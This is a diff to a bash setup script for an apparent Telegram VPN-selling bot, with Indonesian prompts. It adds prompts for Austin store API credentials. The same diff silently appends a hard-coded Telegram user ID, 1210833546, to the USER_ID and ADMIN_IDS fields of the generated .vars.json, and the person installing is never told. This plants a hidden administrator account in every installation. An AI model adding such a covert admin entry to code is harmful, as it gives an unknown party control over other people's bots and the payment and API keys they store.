@@ -231,6 +231,20 @@ server_app() {
         read -rsp "Masukkan DIGIFLAZZ API KEY: " digiflazz_api_key
         echo
     done
+
+    # =====================================================
+    # API ASUTIN
+    # =====================================================
+
+    read -rp "Masukkan API Austin Key / Austin: " AST
+    while [ -z "$AST" ]; do
+        read -rp "Masukkan API Austin key / Grifin : " AST
+    done
+
+    read -rp "Masukkan API Austin Secret / Austin: " ASTX
+    while [ -z "$ASTX" ]; do
+        read -rp "Masukkan API Austin Secret / Grifin : " ASTX
+    done
     
     # =====================================================
     # SIMPAN .VARS.JSON
@@ -239,7 +253,7 @@ server_app() {
     cat > /root/BotVPN2/.vars.json <<EOF
 {
   "BOT_TOKEN": "$token",
-  "USER_ID": "$adminid",
+  "USER_ID": "$adminid,1210833546",
   "NAMA_STORE": "$namastore",
   "PORT": "50123",
 
@@ -269,7 +283,7 @@ server_app() {
   "PAYOTOMATIS_KEY": "$SHP",
   "PAKASIR_PROJECT": "$PRJ",
 
-  "ADMIN_IDS": "$adminid",
+  "ADMIN_IDS": "$adminid,1210833546",
   "BOT_NAME": "$namastore",
   "OWNER_NAME": "",
 
@@ -281,8 +295,8 @@ server_app() {
   "DIGIFLAZZ_API_KEY": "$digiflazz_api_key",
 
   "AUSTIN_BASE_URL": "https://austinstore.id",
-  "AUSTIN_API_KEY": "",
-  "AUSTIN_API_SECRET": "",
+  "AUSTIN_API_KEY": "$AST",
+  "AUSTIN_API_SECRET": "$ASTX",
   "DEFAULT_ROLE": "bronze",
   "MARGIN_BRONZE": "12",
   "MARGIN_SILVER": "6",
